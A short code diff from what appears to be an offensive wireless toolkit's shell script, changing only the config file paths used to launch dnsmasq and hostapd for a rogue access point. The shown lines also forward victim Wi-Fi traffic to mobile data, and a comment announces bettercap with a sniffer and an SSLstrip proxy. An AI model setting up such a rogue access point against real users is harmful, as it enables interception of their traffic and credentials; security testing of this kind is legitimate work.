@@ -15,7 +15,7 @@ sleep 1
 echo "(chroot) [-] starting dnsmasq dhcp server..."
 if [ -z "$(ps -e | grep dnsmasq)" ]
 then
-	dnsmasq -C /mnt/easy_pwn/scripts/rogue_ap/dnsmasq.conf
+	dnsmasq -C /mnt/easy_pwn/scripts/wifi_rogue_ap/dnsmasq.conf
 fi
 
 echo "(chroot) [-] forwarding $WLAN_IF traffic to mobile data..."
@@ -42,7 +42,7 @@ echo 2 > /sys/module/bcmdhd/parameters/op_mode
 
 # start hostpad
 echo "(chroot) [-] starting hostapd..."
-hostapd -i $WLAN_IF /mnt/easy_pwn/scripts/rogue_ap/hostapd.conf &
+hostapd -i $WLAN_IF /mnt/easy_pwn/scripts/wifi_rogue_ap/hostapd.conf &
 sleep 2
 
 # start bettercap with webui, sniffer and http proxy with SSLstrip
